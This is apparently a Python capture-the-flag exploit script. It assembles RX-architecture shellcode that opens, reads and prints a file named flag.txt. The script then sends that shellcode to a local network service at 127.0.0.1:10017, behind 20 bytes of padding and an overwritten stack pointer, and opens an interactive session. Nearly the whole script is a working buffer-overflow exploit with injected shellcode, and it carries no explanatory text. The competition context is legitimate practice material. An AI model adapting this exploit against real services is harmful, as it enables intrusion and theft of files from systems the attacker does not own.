asm = '''.section .text
.global _start
.ascii "%s"
_start:
    bsr get_addr
ret:
    mov [r0], r7
open:
    mov r7, r1
    xor r2, r2
    xor r3, r3
    # arg1 seems to be on stack. why?
    push r3
    push r3
    mov	#2, r5
    int	#255
read:
    mov r7, r2
    mov #0x7f, r3
    mov	#4, r5
    int	#255
write:
    mov #1, r1
    mov r7, r2
    mov #0x7f, r3
    mov	#5, r5
    int	#255
exit:
    mov	#1, r5
    int	#255
get_addr:
    bsr ret
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'rx'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10017
s = mysock(IP, PORT)
s.send('\n000')
pad = 'AAAAAAAAAAAAAAAAAAAA'
SP = 0x1b0c
shellcode = pad + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
